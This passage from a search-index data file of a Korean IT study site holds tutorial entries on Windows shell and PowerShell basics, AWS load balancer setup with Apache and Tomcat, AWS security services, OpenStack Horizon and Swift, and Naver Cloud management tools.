  광고메일 발송을 위한 템플릿 기능, 법적인 기능 ( 제목에 광고 문구 삽입 및 수신 거부 기능 ) 제공\n  템플잇에는 네이버 메일과 동일한 입력기인 스마트 에디터를 제공하고 치환 태그 기능을 통해 변수 사용가능\n      "}),a.add({id:125,href:'/docs/development/shell/shell-7/',title:"Shell Customizing",content:"Shell Programming    Customizing         #\n"}),a.add({id:126,href:'/docs/system/window/window07/',title:"Windows Shell",content:"Windows Shell   Windows CLI   Windows Server는 GUI환경이 아닌 도스환경으로도 실행될 수 있으며, GUI 환경이 아닌 만큼 리소스의 낭비가 적은 특징을 가지고 있습니다.       명렁어   사용자 컴퓨터의 이름을 나타내는 명령어  $ hostname $ echo %computername%     입력 문자를 출력하는 명령어  $ echo Hello #     사용자 컴퓨터의 이름을 변경하는 명령어  $ netdom renamecomputer %COMPUTERNAME% /newname:CORE # 컴퓨터의 이름을 CORE로 변경     재부팅  $ shutdown /r /t 0 # 0/ 초/ 안에 reboot를 진행 # /s stop /r reboot /t time     네트워크 인터페이스 및 네트워크 정보 확인  $ ipconfig     DNS 확인  $ nslookup     화면의 텍스트를 지우는 명령어  $ cls     네트워크 shell 명령어  $ netsh netsh\u0026gt; interface ipv4 show interface # 인터페이스 관련 정보를 출력 netsh\u0026gt; interface ipv4 set address name=\u0026#34;3\u0026#34; source=static address=192.168.10.50 mask=255.255.255.0 gateway=192.168.10.2 # idx의 값이 3인 인터페이스의 ipv4의 주소를 192.168.10.50, 넷마스크 255.255.255.0 게이트웨이를 192.168.10.2로 고정 netsh\u0026gt; interface ipv4 add dnsserver name=\u0026#34;3\u0026#34; address=8.8.8.8 index=1 # idx의 값이 3인 인터페이스의 dns 주소를 8.8.8.8으로 설정     레지스트리 에디터 실행  $ regedit # Value의 값이 0인경우 작동을 안하는 것을 의미     현재 디렉토리의 파일 및 폴더 확인  $ dir #     진입  $ CD         $ #         $ #         $ #         $ #         $ #         $ #         $ #    Window PowerShell  PowerShell이란?    Unix의 셸과 같은 기능을 제공\n  윈도우 서버 2008에서 처음 소개\n  Windows Server를 관리할 때 자주 사용되는 것들\n  PowerShell에서 스크립트로 만들어 놓으면 언제든지 일관된 재사용이 가능\n     PowerShell의 특징    PowerShell은 PowerShell 콘솔에서 대화형으로 사용\n  PowerShell은 텍스트로 구성, 메모장에서 편집가능\n  PowerShell은 대개 대소문자를 구분하지 않음\n  명령어나 경로의 Tab 자동 완성 기능을 제공\n  기존 DOS 명령을 대부분 사용 가능\n      PowerShell 진입  $ powershell # powershell로 쉘을 변경합니다.     설치되어 있는 패키지 확인  PS $ Get-WindowsFeature     설치  PS $ Install-WindowsFeature DHCP -Source wim:D:\\Sources\\install.wim:1 # DHCP 서버 설치     문자 출력  PS $ write-output \u0026#34;문자\u0026#34;     PC 정보출력  PS $ Get-Host     파워셸 업데이트  PS $ Update-help     도움말 출력  PS $ Get-help 명령어 #     파일에 기록  PS $ Add-Content \u0026#34;테스트\u0026#34; -path C:\\myfile.txt # 테스트라는 내용을 C:\\myfile.txt에 기록한다.     파일을 읽음  PS $ Get-Content 파일경로     파일을 복사  PS $ Copy-item 복사할 파일 보사할 위치     파일을 나열  PS $ Get-ChildItem 경로     명령어 출력  PS $ Get-Command 명령어 # Get-Command Write     파워셸 ISE 실행  PS $ PowerShell_ISE #     현재 프로세스 출력  PS $ Get-Process     결과값을 저장  PS $ 명령어 | Export-CSV 경로     노트패드로 실행  $ notepad 경로     보기 편한 모양으로 출력  $ 명렁어 | Out-GridView #         $ #         $ #         $ #         $ #         $ #    "}),a.add({id:127,href:'/docs/aws/awstraining/elb/',title:"AWS ELB ( 2 Tier ) 생성",content:"AWS ELB 생성    이번 장에서는 생성된 인스턴스들을 로드밸런싱하는 방법에 대해 알아보도록 하겠습니다. ELB 또한 중요한 개념이니, ELB에 대한 학습을 원하는 분들은 AWS ELB를 참고해주세요.    AWS ELB 생성    ELB에 대한 생성 순서은 아래의 순서대로 진행합니다.   1. 인스턴스 생성\n2. 대상그룹 생성\n3. 로드 밸런서 생성\n  인스턴스 생성   먼저 기본 VPC에 가용영역 a와 c에 한 대씩, 총 두 대의 인스턴스를 생성해주세요. 보안 그룹은 80은 모두에게, 8009는 서로간만 통신이 가능하게 설정해주세요. 그 후, a,c 인스턴스에 Apach와 Tomcat을 설치 및 연동시켜주세요.   $ apt-get -y update $ apt-get -y upgrade $ apt-get install -y apache2 # apache2 설치 $ systemctl enable apache2 $ ufw allow 80/tcp # apache2 자동시작 및 방화벽 허용 등록 $ apt-get install -y libapache2-mod-jk # 연동 모듈 $ vi /etc/apache2/workers.properties workers.tomcat_home=/usr/share/tomcat8 workers.java_home=/usr/lib/jvm/java-8-openjdk-amd64 worker.list=tomcat8 worker.tomcat8.port = 8009 worker.tomcat8.host = [ 서로 다른 인스턴스 IP ] worker.tomcat8.type = ajp13 worker.tomcat8.lbfactor = 1 # 워커 파일 생성 $ vi /etc/apache2/mods-available/jk.conf JkWorkersFile /etc/libapache2-mod-jk/workers.properties --\u0026gt; JkWorkersFile /etc/apache2/workers.properties $ vi /etc/apache2/sites-available/000-default.conf DocumentRoot /var/www/html --\u0026gt; DocumentRoot /var/lib/tomcat8/webapps/ROOT SetEnvIF Request_URI \u0026#34;/*.html\u0026#34; no-jk JkMount /*.jsp tomcat8 # jsp 파일만 tomcat에서 실행 $ vi /var/www/html/index.html 각 인스턴스에 따라 apache1 and apache2를 입력합니다. $ systemctl restart apache2  Apache 설치   $ apt -y update $ apt -y upgrade $ apt-get install lrzsz # JAVA 간편 다운로드를 위한 Irzsz 설치 $ apt-get install -y openjdk-8-jre $ apt-get install -y openjdk-8-jdk # JAVA 설치 $ which javac $ readlink -f /usr/bin/javac # 자바 위치 확인 $ vi /etc/profile export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 export PATH=$JAVA_HOME/bin/:$PATH export CLASS_PATH=$JAVA_HOME/lib/:$CLASS_PATH $ source /etc/profile # 환경변수 설정 $ echo $JAVA_HOME $ $JAVA_HOME/bin/javac -version # 확인 $ apt-get install tomcat8 -y # tomcat8 설치 $ /usr/share/tomcat8/bin/version.sh # tomcat 설치 확인 $ ufw allow 8080/tcp $ ufw allow 8009/tcp # 방화벽 포트 열기 $ systemctl enable tomcat8 # tomcat 자동시작 $ apt-get install -y libapache2-mod-jk # 연동 모듈 설치 $ vi /etc/tomcat8/server.xml \u0026lt;Connector port=\u0026#34;8009\u0026#34; protocol=\u0026#34;AJP/1.3\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; 주석 헤제 $ systemctl restart tomcat8 $ vi /var/lib/tomcat8/webapps/ROOT/index.jsp \u0026lt;%@ page language=\u0026#34;java\u0026#34; contentType=\u0026#34;text/html; charset=utf-8\u0026#34;%\u0026gt; \u0026lt;!-- 로컬 정보 --\u0026gt; Local IP : \u0026lt;%= request.getRemoteAddr() %\u0026gt;\u0026lt;br\u0026gt; Local Host : \u0026lt;%= request.getRemoteHost() %\u0026gt;\u0026lt;br\u0026gt; \u0026lt;!-- 서버의 기본 경로 --\u0026gt; Context : \u0026lt;%= request.getContextPath() %\u0026gt; \u0026lt;br\u0026gt; URL : \u0026lt;%= request.getRequestURL() %\u0026gt; \u0026lt;br\u0026gt; URI : \u0026lt;%= request.getRequestURI() %\u0026gt; \u0026lt;br\u0026gt; Path : \u0026lt;%= request.getServletPath() %\u0026gt;\u0026lt;br\u0026gt; Server Port : \u0026lt;%= request.getServerPort() %\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; 서버 Root 경로 : \u0026lt;%= application.getRealPath(\u0026#34;/\u0026#34;) %\u0026gt;\u0026lt;br\u0026gt; 서버 Root 경로 : \u0026lt;%= request.getRealPath(\u0026#34;/\u0026#34;) %\u0026gt;\u0026lt;br\u0026gt; \u0026lt;% String strServerIP = request.getServerName(); // 서버 ip String strServerPort = Integer.toString(request.getServerPort()); // 서버 port String serverRootUrl = \u0026#34;http://\u0026#34;+ strServerIP +\u0026#34;:\u0026#34;+ strServerPort +\u0026#34;/\u0026#34;; // Root 경로 out.println(serverRootUrl ); %\u0026gt;  Tomcat 설치     Application Load Balancer 생성 ( 이하 ALB )   ALB에 대한 설명은 ALB Link를 참조해주세요.    ALB를 생성하기 위해 메뉴에서 로드 밸런서 -\u0026gt; 로드밸런서 생성을 클릭합니다.      로드 밸런서의 유형 중 ALB를 선택합니다.      위의 그림과 같이 ALB의 구성에 대한 설정을 진행합니다. 체계의 인터넷 연결은 외부대역과의 통신을 위한 설정이고, 내부는 서브넷끼리의 통신을 위한 설정입니다. 리스너는 로드 밸런서에서 읽은 포트를 설정합니다. 가용 영역은 로드 밸런서가 활성화될 가용 영역을 지정합니다.      보안그룹은 외부와의 통신을 위해 80/tcp를 모두에게 개방하게 설정합니다.      위의 그림과 같이 라우팅 구성에 대한 설정을 진행합니다. 대상 유형은 라우팅의 대상이 될 서비스를 지정하는 설정입니다. 프로토콜과 포트는 대상 유형의 라우팅을 지정하는 설정입니다. 상태검사는 경로로 접속하였을 때, 접속이 가능하면 Health, 불가능하면 Unhealth로 나타냅니다.      설정이 끝나면, 대상 등록에 인스턴스를 등록합니다.       ELB의 생성이 완료되면, DNS 접속을 통해 확인할 수 있습니다.      또한 대상 그룹으로 이동하여 healthy 상태를 체크할 수 있습니다.     Network Load Balancer 생성 ( 이하 NLB )  NLB에 대한 설명은 NLB Link를 참조해주세요.      NLB 생성을 위해 다시 로드밸런서로 돌아와, 로드 밸런서 생성을 클릭합니다.      로드 밸런서 유형에서 NLB를 선택합니다.      NLB의 구성을 위와 같이 설정합니다. 8009 포트는 톰캣과 아파치이 연동을 위한 포트 입니다.      라우팅 테이블을 구성합니다.      프라이빗 주소의 8009 포트로 인스턴스들을 등록합니다.     $ vi /etc/apache/workers.properties worker.tomcat8.host = [ NLB DNS ]  Apache의 워커 파일은 NLB의 DNS로 설정합니다.      설정해 두었던 ALB로 접속하여 index.jsp로 접속하면 톰캣을 통해 jsp로 접속하는 것을 확인 할 수 있습니다.      대상그룹 또한 healthy를 확인할 수 있습니다.     Classic Load Balancer 생성 ( 이하 CLB )  CLB에 대한 설명은 CLB Link를 참조해주세요.    CLB를 생성하기 위해 다시 로드 밸런서 생성을 클릭하세요.      로드 밸런서 유형 중 CLB를 클릭하세요.      ELB와 동일하게 외부대역으로 설정합니다..      보안그룹 또한 기존 ELB-sg를 사용합니다.      상태검사를 설정합니다.    # 인스턴스를 추가하고, 로드 밸런싱을 활성화합니다.    # CLB의 DNS로 접속해보면, ELB와 같은 결과를 얻을 수 있습니다.    # CLB또한 상태검사가 가능합니다.     예제 1. 서로 다른 Public 서브넷 2개, Private 서브넷 2개를 생성하여 각각 인스턴스를 생성한 후, ELB로 접속이 가능하게 구현하세요.  \r예제 1. 답안\r↕\r\r VPC를 생성 후, ALB와 NLB를 사용합니다.  \r\r\r "}),a.add({id:128,href:'/docs/aws/amazonwebservice/aws_security/',title:"AWS Security",content:"AWS Security    기본적으로 AWS의 보안적 요소는 설비, 인프라 등과 관련된 물리적인 부분과 네트워크 인프라 등은 AWS가 책임을 지고 보안 대책을 수행합니다. 이러한 인프라 위의 OS, 애플리케이션, 네트워크 설정, 계정 관리 등은 사용자가 책임을 져야 하는 공유 책임 모델의 구조를 띄고 있습니다.    AWS가 제공하는 기본적인 보안 서비스      AWS 제공 서비스 서비스 개요     통신 경로 암호화 AWS 매니지먼트 콘솔로의 접속 또는 API를 사용할 때 HTTPS를 사용해 데이터를 암호화합니다.   Security Group\u0026amp; NetworkACL 인스턴스들의 보안 그룹과 서브넷들의 통신 허가/ 거부 설정을 하는 네트워크 ACL을 사용해 예상하지 못하는 통신을 사전차단합니다.   Identity and Access Management( IAM ) 사용자의 역할을 분리하고 최소한의 권한만을 부여하여 보안을 유지합니다.   Multi Factor Authentication ( MFA ) AWS 계정 또는 IAM 계정에 일회성 비밀번호 인증을 추가합니다.   Virtual Private Cloud ( VPC ) 퍼블릭 클라우드에 프라이빗 환경을 구축합니다. 다른 거점에서 VPN으로 접속할 수도 있습니다.   Direct Connect ( 전용선 연결 ) On Premise 환경에서 AWS 전용선을 통해 직접 연결하여 데이터 도청, 변조 등의 위험을 줄일 수 있습니다.   데이터 암호화 EBS, S3, Glacier, Redshift, RDS에 저장하고 있는 데이터 또는 객체를 암호화할 수 있습니다.   Hardware Security Module ( CloudHSM ) 암호화 키를 안전하게 저장하고 관리합니다.   Trusted Advisor AWS 지원이 제공하는 서비스 중에 하나로, 각종 서비스의 설정과 운용 상황을 확인해서 개선할 부분을 제공해줍니다.     Amazon Inspector    Amazon Inspector는 AWS에 배포된 애플리케이션의 보안 및 규정 준수를 개선하는데 도움이 되는 자동 보안 평가 서비스 모범 사례로부터 애플리케이션의 노출, 취약성 및 편차를 자동으로 평가 심각도 수준에 따라 우선순위가 지정된 상세한 보안 평가 결과 목록을 생성 Amazon EC2 인스턴스의 의도하지 않은 네트워크 접근성과 이 EC2 인스턴스의 취약성을 확인 Amazon Inspector 평가는 일반 보안 모범 사례 및 취약성 정의에 매핑된 사전 정의 규칙 패키지로 제공    AWS Artfact    AWS Artifact는 자신에게 해당되는 규정 준수와 관련된 정보를 제공하는 신뢰할 수 있는 중앙 리소스 AWS 보안 및 규정 준수 보고서와 엄선된 온라인 계약에 대한 온디맨드 액세스를 제공 보고서에는 SOC(Service Organization Control) 보고서와 PCI(Payment Card Industry) 보고서, 그리고 여러 지역의 인정 기구와 규정 준수 기관에서 AWS 보안 제어의 구현 및 운영 효율성을 입증하는 인증서가 포함    AWS CertificateManager    AWS Certificate Manager는 AWS 서비스 및 연결된 내부 리소스에 사용할 공인 및 사설 SSL/TLS(Secure Sockets Layer/전송 계층 보안) 인증서를 손쉽게 프로비저닝, 관리 및 배포할 수 있도록 지원하는 서비스 AWS Certificate Manager는 SSL/TLS 인증서를 구매, 업로드 및 갱신하는 데 드는 시간 소모적인 수동 프로세스를 대신 처리  SSL/ TLS, HTTPS  \rSSL/ TLS, HTTPS\r↕\r\r SSL/ TLS ( Secure Soket Layer, Transport Layer Security )  상위 계층 메시지를 분할, 압축하고 메시지 인증 코드 ( MAC )추가 및 암호화하는 작업을 수행하는 프로토콜 Handshake 프로토콜에서 클라이언트와 서버는 상대방을 확인하고 사용할 키 교환 방식, 암호화 방식, 생성에 필요한 값 등을 전달하여 암호화 채널 수립을 위한 항목들을 협상 단말 ( PC, server 등 )과 단만간의 암호화 통신을 위한 프로토콜 SSLv1은 최초의 버전으로서 문제가 많아 발표되지 않고 사장됨 SSLv2부터 공개가 되었으며 보다더 나은 버전인 SSLv3가 나왔으면 이를 기반으로 TLSv1 생성 TLSv1.0 v1.1, v1.2, v1.3이 나왔지만 아직 많은 브라우저에서 TLSv3을 지원하지 않음   SSL handshake  Client Hello: Client가 Server에게 자신이 사용가능한 Random byte( 대칭키 생성에 사용됨 ), Session ID, S니/ TLS 버전이 포함된 Cipher suite list를 전달 Server Hello: Server 가 Client가 보낸 Cipher suite List 중 하나를 선택해 전달 Client Key exchange: 키 교환 실시 ( 실제 데이터 암호화에 사용할 키를 전달하여, S니 인증서에서 추출된 공개키로 암호화 ) Server certificate: 서버의 인증서를 클라이언트에게 전송 Sever hello done: 서버 전달 종료 Change cipher Specs, Finished: 이후 보내는 메시지들은 협상된 암호화 알고리즘에 따라 보낼 것임을 통보 Finished, Change cipher Specs: 클라이언트가 보낸 메시지를 확인 후, handshake를 종료하고 하나의 대칭키로 통신한다고 통보  \r\r\r    AWS CloudHSM    AWS CloudHSM은 AWS 클라우드에서 자체 암호화 키를 손쉽게 생성 및 사용할 수 있도록 지원하는 클라우드 기반 하드웨어 보안 모듈(HSM) 사용자를 위해 하드웨어 프로비저닝, 소프트웨어 패치, 고가용성, 백업 등 시간 소모적인 관리 작업을 자동화하는 완전관리형 서비스 CloudHSM에서는 FIPS 140-2 레벨 3 인증 HSM을 사용하여 자체 암호화 키를 관리가능 모든 키를 대부분의 상용 HSM으로 내보내기 가능 CloudHSM을 사용하면 선결제 비용 없이 온디맨드로 HSM 용량을 추가 및 제거하여 신속하게 확장/축소가능   \rCloudHSM\r↕\r\r사용방법  AWS CloudHSM은 자체 Amazon Virtual Private Cloud(VPC)에서 실행되므로, Amazon EC2 인스턴스에서 실행되는 애플리케이션에 손쉽게 HSM을 사용 CloudHSM에서는 표준 VPC 보안 제어 기능을 사용하여 HSM에 대한 액세스를 관리가 가능 애플리케이션은 HSM 클라이언트 소프트웨어가 설정한 상호 인증된 SSL 채널을 사용하여 HSM에 연결 HSM은 고객의 EC2 인스턴스와 가까운 Amazon 데이터 센터에 위치하므로, 온프레미스 HSM과 비교하여 애플리케이션과 HSM 간 네트워크 지연 시간을 줄일 수 있음 업무 분리 및 역할 기반 액세스 제어는 AWS CloudHSM의 설계에 내제   AWS에서 하드웨어 보안 모듈(HSM) 어플라이언스를 관리하지만, 고객의 키에 대한 액세스 권한이 없음 고객이 자체 키를 제어하고 관리 애플리케이션 성능이 개선 다중 AZ(가용 영역)에 제공되는 변조 방지 하드웨어에 키를 안전하게 저장 고객의 HSM은 고객의 Virtual Private Cloud(VPC)에 상주하며 다른 AWS 워크로드와 격리  \r\r\r   AWS DirectoryService    AWS Directory Service는 다른 AWS 서비스에서 Amazon Cloud Directory 및 Microsoft Active Directory(AD)를 사용할 수 있는 몇 가지 방법을 제공하는 서비스 사용자, 그룹 및 디바이스에 대한 정보를 저장하고, 관리자는 이를 사용하여 정보 및 리소스에 대한 액세스를 관리 AWS Directory Service는 클라우드에서 기존 Microsoft AD 또는 LDAP(Lightweight Directory Access Protocol)–인식 애플리케이션을 사용하려는 고객에게 다양한 디렉터리 선택 옵션을 제공    AWS IAM    AWS 리소스에 대한 엑세스를 안전하게 제어할 수 있는 서비스로 IAM을 사용하여 리소스를 사용하도록 권한을 부여하거나 인증된 대상을 제어 IAM 정책은 \u0026ldquo;Action ( 어떤 서비스에 )\u0026rdquo;, \u0026ldquo;Resource ( 어떤 기능 또는 범위를 )\u0026rdquo;, \u0026ldquo;Effect ( 허가할 것인가 )\u0026ldquo;라는 3가지 규칙을 기반으로 AWS 서비스를 사용하는 데 필요한 권한을 설정 주요기능  AWS 계정에 대한 공유 엑세스 서비스별 세분화된 권한 제공 가능 EC2에서 실행되는 앱을 위한 AWS 리소스 엑세스 권한 제공 멀티 팩터 인증 ( MFA ) 자격 증명 연동   AWS 서비스들은 IAM Role을 할당받아 권한을 부여받을 수 있음 Access Key와 Secret Access Key를 직접 입력하지 않고 권한 부여 가능 IAM 사용자 계정을 만들어 사용자에게 적절한 권한을 부여하고 사용 가능한 서비스를 제한할 수 있음 사용자와 그룹은 N : N 의 관계가 성립이 가능   정책 ( Policy )  User, Group, Role이 사용할 수 있는 권한의 범위를 지정하는 것 S3FullAccess, Administrator Access 등 다양한 엑세스 권한이 이미 정의되어 있으며 이를 ‘AWS 관리형 이라 함 사용자 정의 정책 생성  JSON 형식 또는 직접 선택을 통해 사용자 정의 정책 선택 가능     역할 ( Role )  특정 권한을 가진 계정에 생성할 수 있는 IAM 자격증명 역할에는 다음과 같은 주체가 있음  AWS 계정의 IAM 사용자 AWS의 서비스 ( EC2, RDS, ELB 등 ) 외부 자격 증명 공급자 서비스에 의해 인증된 외부 사용자   역할 생성시 IAM 사용자, 서비스, 외부 사용자 등 주체를 정해야 함 하나의 역할에는 다수의 정책을 연결할 수 있음 생성된 역할을 서비스 혹은 IAM 사용자 등에 연결 Region에 국한되지 않고 사용 가능 신규 유저는 생성시 아무런 권한이 없으며 Access Key와 Secret Access Key가 할당 각 키는 최초 생성시에만 볼 수 있으며 즉시 보관해야 함   그룹\u0026amp; 사용자  사용자는 IAM 사용자를 의미하여 관리자 계정에 의해 부여받은 권한에 한해 제한된 서비스에 접근할 수 있는 계정을 의미 콘솔 로그인과 프로그래밍 엑세스 가능 여부를 선택하여 생성 가능 콘솔 로그인이 승인된 경우, 별도의 링크를 통해 콘솔에 로그인 할 수 있음 각 사용자마다 정책을 부여할 수 있음 사용자 모두에게 일일이 부여하기 힘들거나 그룹단위로 통제하고 싶은 경우, Group을 사용할 수 있음 그룹은 이미 생성된 사용자와 권한을 설정할 수 있으며, 그룹 내 모든 사용자는 그룹의 권한을 적용받음   특징  권한  AWS의 서비스나 자원에 어떤 작업을 할 수 있는지 명시해두는 규칙 \u0026quot; 서울 리전에 있는 모든 EC2를 조회할 수 있다\u0026rdquo; 와 같은 항목이 하나의 권한을 칭한다.   정책  권한들의 모음으로, 사용자나 권한들에 직접 적용은 불가능하며, 권한들로 만든 정책을 적용 정책은 사용자, 그룹, 역할에 적용할 수 있다.   사용자  사용자는 AWS의 기능과 자원을 이용하는 객체, 사용자별로 어떤 권한을 가졌는지 세분화해서 지정할 수 있으며, 사용자는 AWS Console에 접근할 수 있는 사람일 수도 있고, 자동화되어 실행되는 프로그램일 수도 있다. 접속하는 사용자인 경우에는 비밀번화가 제공되지만, 프로그램인 경우에는 액세스 키 ID와 비밀 엑세스 키가 제공된다.   그룹  여러 사용자에게 공통으로 권한을 부여할 수 있게 만들어진 개념이다. 하나의 그룹에 여러 명의 사용자를 지정이 가능   역할  어떤 행위를 하는 객체에 여러 정책을 적용한다는 점에서 사용자와 비슷ㅎ자ㅣ만 객체가 사용자가 아닌 서비스나 다른 AWS 계정의 사용자라는 점에서 차이가 있다. 사용자가 아닌 특정 서비스에서 생성한 객체에 권한을 부여하는 데 사용   인스턴스 프로파일  사용자가 사람을 구분하고 그 사람에 권한을 주기 위한 개념이었따면, 인스턴스 프로파일은 EC2 인스턴스를 구분하고 그 인스턴스에 권한을 주기 위한 개념      Amazon Cognito    Amazon Cognito는 웹 및 모바일 앱에 대한 인증, 권한 부여 및 사용자 관리를 제공 사용자는 사용자 이름과 암호를 사용하여 직접 로그인하거나 Facebook, Amazon, Google 또는 Apple 같은 타사를 통해 로그인가능 Cognito를 사용한 사용자 인증과 접속허가 종류  Identity Provider를 사용한 인증 Cognito를 사용한 Credential 발행 IAM 규칙   Cognito는 SQLite 데이터베이스를 사용, 시간적으로 마지막에 수정된 데이터를 우선적으로 하는 방침을 가짐 Cognito는 Identity Pool 단위를 사용    AWS KMS ( Key Management Service )    AWS Key Management Service(AWS KMS)는 데이터 암호화에 사용하는 암호화 키인 고객 마스터 키(CMK)를 쉽게 생성하고 제어할 수 있게 해주는 관리형 서비스    AWS Organizations    AWS Organizations는 AWS의 워크로드가 증가하고 확장됨에 따라 환경을 중앙에서 관리하는 서비스 계정 생성을 자동화하고, 비즈니스 요구를 반영하도록 계정 그룹을 생성하고, 거버넌스를 위해 이러한 그룹에 정책을 적용이 가능 AWS 계정에 대해 단일 결제 방법을 설정하여 결제 과정을 간소화가 가능 WS Organizations는 모든 AWS 고객이 추가 비용 없이 사용가능    AWS Shield    분산 서비스 거부 공격( DDoS )으로부터 웹 어플리케이션을 보호하는 서비스 Cloudfront와 통합되어 있기 때문에 AWS의 서비스가 아니더라도 Cloudfront의 origin이라면 보호가 가능   Shield의 종류  Shield Stanard  기본적으로 적용되는 서비스로 설정을 하지 않아도 AWS 서비스에 활성화 되어있음   Shield Advanced  추가 비용을 내고 추가적인 서비스를 제공받는 것으로 L7 트래픽 모니터링, 사후 분석 등의 기능을 제공      AWS WAF ( Web Application Firewall )    웹 방화벽으로 Cloudfront와 ALB를 통해 서비스를 제공 ( ALB와 Cloudfront를 직접 지정하여 웹방화벽을 제공 ) WAF을 활용하면 다양한 종류의 웹 공격에 대한 정보를 지닌 Rule을 선택하여 활성화하거나, 특정 Ip의 요청을 막을 수 있음   웹방화벽  방화벽이 L4/ L4 Layer의 방어 ( IP와 Port 차단 )을 이용 웹 방화벽은 L7( HTTP 헤더, HTTP 본문, URI 문자열, SQL 명령어, 스크립팅 )을 이용한 공격을 방어  \r "}),a.add({id:129,href:'/docs/azure/azuretraining/',title:"Azure Training",content:" Azure     Azure Training   Azure\n  Azure\n  Azure\n       Azure Docs   Azure\n  Azure\n  Azure\n      "}),a.add({id:130,href:'/docs/openstack/openstack/horizon/',title:"Horizon",content:"외부 인터페이스 대시보드 서비스 : Horizon   외부 인터페이스 대시보드 서비스 : Horizon    사용자가 웹 UI로 인스턴스 생성, 삭제, 관리 등을 쉽고 빠르게 처리할 수 있게 지원 Horizon은 아파치 웹 서버를 사용 및 Python, Django 프레임워크로 구현     논리 아키텍처의 Horizon   논리 아키텍처에서 보이는 Horizon은 단순히 Horizon 자체 모듈만 존재 모든 서비스의 API와 연동해서 사용자에게 웹 서비스를 제공  "}),a.add({id:131,href:'/docs/ncp/ncptraining/nca08/',title:"Naver Cloud Management",content:"Cloud Managent   Cloud 상에 서비스들을 관리할 수 있는 Cloud형 관리도구    Monitoring    클라우드 리소스 상태 모니터링 수행\n  모든 상품에 대해 모니터링 서비스 제공\n  기본 : 상품 별 모니터링 그래프 확인 가능\n  상세 : 메트릭에 대한 임계치 설정과 이벤트 발생 시 Alert 기능 ( SMS / E-mail ) 제공\n  83개 세부 항목에 대한 모니터링 성능 정보를 수집하며, 그 중 약 60여개의 세부 항목에 대한 이벤트 경보 설정 가능\n  Monitoring API 제공\n       Sub Account    서브 계정 별 역할 부여를 통한 리소스 관리\n  다수의 사용자가 동일한 자원을 이용하고 관리할 수 있도록 역할을 부여한 서브 계정을 제공하는 서비스 ( RBAC )\n  2차 인증 ( 2-Factor Authentication ) 설정\n  서브 계정이 작업한 모든 내역은 Cloud Activity Tracer 상품에서 확인가능\n       WMS ( Web service Monitoring System )    고객의 웹 페이지 품질 측정도구\n  웹 서비스 URL을 입력하여 실시간으로 테스트를 진행할 수 있고, 스케줄을 등록하여 반복적인 모니터링 수행도 가능\n  경보 설정을 통해 등록된 URL에서 오류가 감지되면 SMS나 EMAIL을 통해 알람 발송 가능\n  시나리오 기반 모니터링을 제공하여, 사용자 이용 패턴에 따른 각 기능별 모니터링 수행 가능\n       Cloud Activity Tracer   다양한 계정 활동 로그 수집   약 155종류의 네이버 클라우드 플랫폼의 액션 로그 수집\n  Management 콘솔, API, SDK, CLI를 통한 계정 별 액션 로그와 비 계정 활동에 대한 로깅 기능 제공\n  CLoud Log Analytics와의 연동(필수)으로 로그 분석 및 로그를 엑셀로 다운로드 받거나 object Storage로 Export 가능\n       Resource Manager    리소스들을 통합적으로 관리하는 서비스\n  네이버 클라우드 플랫폼 서비스 내 생성한 모든 리소스를 한 눈에 볼 수 있는 통합 관리 서비스\n  목적에 따라 자원들을 그룹화하거나 태그를 지정하여 다양하게 활용\n  리소스 별 생성 및 변경 이력을 확인가능\n      "}),a.add({id:132,href:'/docs/openstack/openstack/swift/',title:"Swift",content:"오브젝트 스토리지 관리 서비스 : Swift    다른 서비스와는 다르게 단독으로 구성되며, 클라우드 스토리지 서비스 ( ex : 네이버 클라우드 ) Swift 서비스는 Object Storage 서비스 중 하나 분산 구조의 Object 데이터의 저장 스토리지 체계로 구성 빠른 성능 및 대용량 저장공간이 필요 할 때 사용 동영상, 이미지, 디스크 이미지 등의 대용량, 비정형 데이터를 파일과 메타데이터로 저장하여 분산 관리     오브젝트 스토리지 관리 서비스 : Swift   Swift의 논리 아키텍처     구성요소 역할     swift-proxy-server 사용자가 서비스를 다루기 위한 REST API 서비스   swift-account-server 계정 정보 및 사용자 정보를 관리하고 각 컨테이너 별 정보를 관리하기 위한 데몬 프로세스   swift-container-server 사용자 게정의 컨테이너를 간리하는 서비스   swift-object-server 실제 데이터를 저장하고 관리하는 서비스     어카운트, 컨테이너는 별도의 메타데이터가 데이터베이스로 관리 오브젝트는 저장 공간에 직접 저장되는 방식으로 구성 swift-proxy-server는 오픈스택의 Object API를 제공 사용자는 API를 사용해 데이터를 사용     Swift의 논리적 구성 요소    Swift서비스는은 스토리지 공간 여러 개를 합쳐 하나의 커다란 공간으로 가상화하고, 그 안에서 사용자만의 별도 스토리지 공간이 있는 것처럼 다시 가상화\n  swift-proxy-server는 스토리지 노드 여러 개를 관리하며 사용자 인증을 담당, 최근에는 Keystone으로 인증을 처리하며, 프록시 서버와 함께 설치\n  기본적으로 스토리지 노드에는 swift-account-server, swift,compute-server, swift-object-server가 실행되며 실제 메타데이터파일이나 오브젝트에 해당하는 데이터 파일을 저장\n  Swift 역시도 Nova를 구성할 떄와 마찬가지로 스토리지 노드가 여러 호스트로 구성이 가능\n  각 스토리지 노드에는 swift-account-server, swift-container-server, swift-object-server가 실행\n  서버들은 관리자가 설정한 해당 포트로 서로 통신\n  스토리지 노드 중 하나라도 손상이 되면 데이터를 잃지 않도록 데이터 복제(Replica)프로세스가 함께 실행\n     Swift Ring   스토리지 파일은 자신이 관리하는 데이터를 서로 공유하려고 Ring인 파일이 어느 노드에, 어떤 데이터가 들어 있는 지를 인지 이를 확인하기 위해 사용도는 것이 Ring 파일 Ring파일은 프록시 노드에서 생성해 모든 스토리지 노드가 동일하게 소유 Ring 파일에는 디바이스 정보  디바이스를 구분하는 ID 존(Zone) 번호 스토리지 노드 IP 포트 디바이스 이름 디바이스 비중 기타 디바이스 정보       Swift의 데이터 관리 방법    Swift는 사용자 게정을 관리하는 어카운트, 디렉터리 개념의 컨테이너, 실제 파일을 표현하는 오브젝트로 구성\n  Swift는 어카운트가 컨테이너를 포함하고, 컨테이너가 오브젝트를 포함하도록 관리\n  기본적으로 Swift에서는 프록시 노드 한 대에 스토리지 노드 다섯 대를 구성하기를 권장\n  프록시 노드들은 로드밸런서로 묶여 있어 사용자는 특정 URL 하나만 호출해도 스토리지 서비스를 자유롭게 사용가능\n  파일을 올릴 때는 설정된 리플리카로 여러 스토리지 노드로 분산해서 저장, 다운로드 시 그 중 한 곳을 사용\n     Swift와 Keystone    Swift에는 SwAuth를 이용하는 인증 방법과 Keystone을 이용\n  최근에는 Keystone을 이용해서 